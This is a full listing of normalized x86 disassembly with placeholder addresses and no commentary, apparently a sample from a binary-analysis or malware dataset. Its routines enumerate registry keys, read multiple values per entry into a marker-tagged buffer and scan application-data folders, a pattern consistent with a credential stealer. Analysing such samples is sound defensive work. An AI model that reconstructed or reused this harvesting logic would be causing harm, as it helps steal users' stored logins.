push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
pop eax
push 0xbeef0001
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
pop eax
push 0xbeef0002
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_405c0e
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x9
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x1a
push [ ebp + 0x8 ]
call sub_405bad
push 0x23
push [ ebp + 0x8 ]
call sub_405bad
push 0x1c
push [ ebp + 0x8 ]
call sub_405bad
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_405c50
push ebp
mov ebp esp
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push 0x0
push rw-data
push rw-data
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push rw-data
push [ ebp + 0x8 ]
call sub_404161
leave
retn 0xc
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_405cc9
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0xa
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push [ ebp + 0x8 ]
call sub_405c50
push 0xbeef0001
push rw-data
push [ ebp + 0x8 ]
call sub_405c50
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_405d11
push ebp
mov ebp esp
add esp 0xfffff7d8
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ rw-data ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0x8
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x810 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x818 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x820 ] eax
lea eax [ ebp - 0x828 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
jmp r-xdata
or eax eax
je r-xdata
cmp [ ebp - 0x828 ] 0x4
jne r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0x824 ] 0x15
push eax
call sub_401835
push [ eax ]
pop [ ebp - 0x824 ]
push eax
call sub_401835
jmp r-xdata
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x820 ]
call sub_401835
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
cmp [ ebp - 0x81c ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x820 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x824 ]
push [ ebp + 0x8 ]
call sub_4014e6
sub_405f10
push ebp
mov ebp esp
add esp 0xfffffff8
push 0x0
push 0xb
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push eax
push 0xbeef0001
push [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_403ddc
call sub_401835
push rw-data
push [ ebp + 0x8 ]
call sub_405d11
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push eax
push 0xbeef0002
push [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_403ddc
call sub_401835
sub_405fa9
push ebp
mov ebp esp
add esp 0xfffff7dc
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ rw-data ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0x8
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x810 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x820 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x818 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x824 ] eax
cmp [ ebp - 0x81c ] 0x0
je r-xdata
jmp r-xdata
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x820 ]
call sub_401835
push [ ebp - 0x824 ]
call sub_401835
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_405fa9
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x820 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x824 ]
push [ ebp + 0x8 ]
call sub_401548
sub_406191
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0xc
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_405fa9
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_4061c2
push ebp
mov ebp esp
add esp 0xfffff7d0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ rw-data ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0x8
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401dc9
mov [ ebp - 0x810 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x818 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x820 ] eax
lea eax [ ebp - 0x82c ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
jmp r-xdata
or eax eax
je r-xdata
cmp [ ebp - 0x82c ] 0x4
jne r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0x824 ] 0x15
push eax
call sub_401835
push [ eax ]
pop [ ebp - 0x824 ]
push eax
call sub_401835
jmp r-xdata
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x820 ]
call sub_401835
push [ ebp - 0x828 ]
call sub_401835
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
lea eax [ ebp - 0x830 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x828 ] eax
cmp [ ebp - 0x81c ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push 0xbeef0010
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x824 ]
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x820 ]
push [ ebp + 0x8 ]
call sub_401548
cmp [ ebp - 0x828 ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4014e6
cmp [ ebp - 0x830 ] 0x4
jne r-xdata
mov eax [ ebp - 0x828 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_4014e6
jmp r-xdata
sub_406423
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0xd
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_4061c2
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_406454
push ebp
mov ebp esp
add esp 0xfffff7cc
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ rw-data ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0x8
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401dc9
mov [ ebp - 0x810 ] eax
lea eax [ ebp - 0x834 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x818 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x820 ] eax
lea eax [ ebp - 0x828 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
jmp r-xdata
mov [ ebp - 0x824 ] 0x15
cmp [ ebp - 0x828 ] 0x4
jne r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0x82c ] 0x0
cmp [ ebp - 0x830 ] 0x4
jne r-xdata
push [ eax ]
pop [ ebp - 0x824 ]
jmp r-xdata
cmp [ ebp - 0x81c ] 0x0
je r-xdata
cmp [ ebp - 0x82c ] 0x2
jne r-xdata
push [ eax ]
pop [ ebp - 0x82c ]
jmp r-xdata
push eax
call sub_401835
lea eax [ ebp - 0x830 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x820 ]
call sub_401835
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x834 ]
push eax
push [ ebp - 0x81c ]
call sub_4041a1
or eax eax
je r-xdata
push eax
call sub_401835
cmp [ ebp - 0x81c ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push [ ebp - 0x81c ]
call sub_401835
mov [ ebp - 0x81c ] 0x0
cmp [ ebp - 0x834 ] 0x0
jne r-xdata
push 0xbeef0002
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x834 ]
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0x824 ]
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x820 ]
push [ ebp + 0x8 ]
call sub_401548
sub_4066da
push ebp
mov ebp esp
add esp 0xfffffff4
push 0x0
push 0xe
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_406454
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
mov [ ebp - 0xc ] eax
push 0xbeef0001
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0xc ]
call sub_401835
sub_406765
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0xf
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_4067a0
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x10
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov [ rw-data ] 0x5c
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push rw-data
push eax
call sub_401dc9
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_406821
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push 0x0
push 0x11
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
jmp r-xdata
push esi
call sub_4023a8
push rw-data
push eax
call sub_401dc9
push eax
push 0xbeef0000
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
cmp [ esi ] 0x0
jne r-xdata
inc esi
inc esi
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
sub_4068a5
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x12
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_4068e0
push ebp
mov ebp esp
add esp 0xfffff7dc
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ rw-data ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0x8
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x810 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x818 ] eax
lea eax [ ebp - 0x824 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
jmp r-xdata
or eax eax
je r-xdata
cmp [ ebp - 0x824 ] 0x4
jne r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0x820 ] 0x15
push eax
call sub_401835
push [ eax ]
pop [ ebp - 0x820 ]
push eax
call sub_401835
jmp r-xdata
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
cmp [ ebp - 0x81c ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x820 ]
push [ ebp + 0x8 ]
call sub_4014e6
sub_406aa8
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x13
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_4068e0
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_406ad9
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x14
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_406b14
push ebp
mov ebp esp
add esp 0xfffff7d8
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ rw-data ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0x8
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x810 ] eax
call sub_401835
lea eax [ ebp - 0x828 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x818 ] eax
lea eax [ ebp - 0x824 ]
push eax
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
jmp r-xdata
or eax eax
je r-xdata
cmp [ ebp - 0x824 ] 0x4
jne r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0x820 ] 0x15
push eax
call sub_401835
push [ eax ]
pop [ ebp - 0x820 ]
push eax
call sub_401835
jmp r-xdata
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
cmp [ ebp - 0x81c ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x828 ]
push eax
push [ ebp - 0x81c ]
call sub_4041a1
or eax eax
je r-xdata
cmp [ ebp - 0x828 ] 0x0
je r-xdata
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x828 ]
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0x820 ]
push [ ebp + 0x8 ]
call sub_4014e6
sub_406d08
push ebp
mov ebp esp
add esp 0xfffffff4
push [ ebp + 0xc ]
call lstrlenA
mov [ ebp - 0x8 ] eax
push [ ebp - 0x8 ]
call sub_40184c
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call sub_402616
or eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_401835
leave
retn 0x8
mov [ ebp - 0xc ] eax
push 0x0
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_4041a1
or eax eax
je r-xdata
push 0xbeef1000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40151c
sub_406d80
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push [ ebp + 0xc ]
call sub_401eb3
or eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_401f7a
or eax eax
je r-xdata
pop esi
leave
retn 0x8
pop esi
leave
retn 0x8
push [ ebp - 0x4 ]
call sub_40184c
mov [ ebp - 0x14 ] eax
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
call sub_401883
mov esi [ ebp - 0x14 ]
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push rw-data
push esi
call StrStrIA
or eax eax
jne r-xdata
push 0xbeef1001
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0x14 ]
call sub_401835
lea eax [ ebp - 0x10 ]
push eax
call sub_40200e
jmp r-xdata
mov esi eax
push rw-data
call lstrlenA
add esi eax
mov [ ebp - 0x18 ] esi
push rw-data
push esi
call StrStrIA
or eax eax
jne r-xdata
jmp r-xdata
mov dl [ eax ]
mov [ eax ] 0x0
push eax
push edx
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_406d08
pop edx
pop eax
mov [ eax ] dl
jmp r-xdata
sub_406e4b
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x15
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_406b14
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push 0x1a
call sub_401e2e
or eax eax
je r-xdata
push rw-data
push eax
call sub_401dc9
push eax
push eax
push [ ebp + 0x8 ]
call sub_406d80
call sub_401835
push 0x1c
call sub_401e2e
or eax eax
je r-xdata
push rw-data
push eax
call sub_401dc9
push rw-data
push eax
call sub_401dc9
push eax
push eax
push [ ebp + 0x8 ]
call sub_406d80
call sub_401835
push 0x23
call sub_401e2e
or eax eax
je r-xdata
push rw-data
push eax
call sub_401dc9
push rw-data
push eax
call sub_401dc9
push eax
push eax
push [ ebp + 0x8 ]
call sub_406d80
call sub_401835
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push rw-data
push eax
call sub_401dc9
push rw-data
push eax
call sub_401dc9
push eax
push eax
push [ ebp + 0x8 ]
call sub_406d80
call sub_401835
sub_406f41
push ebp
mov ebp esp
add esp 0xfffff7dc
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0x10 ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x810 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x820 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x818 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x824 ] eax
cmp [ ebp - 0x81c ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
cmp [ ebp - 0x820 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x820 ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x824 ]
call sub_401835
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406f41
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x820 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x824 ]
push [ ebp + 0x8 ]
call sub_401548
sub_407123
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x16
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_406f41
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_406f41
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40716c
push ebp
mov ebp esp
add esp 0xfffff7dc
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0x10 ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
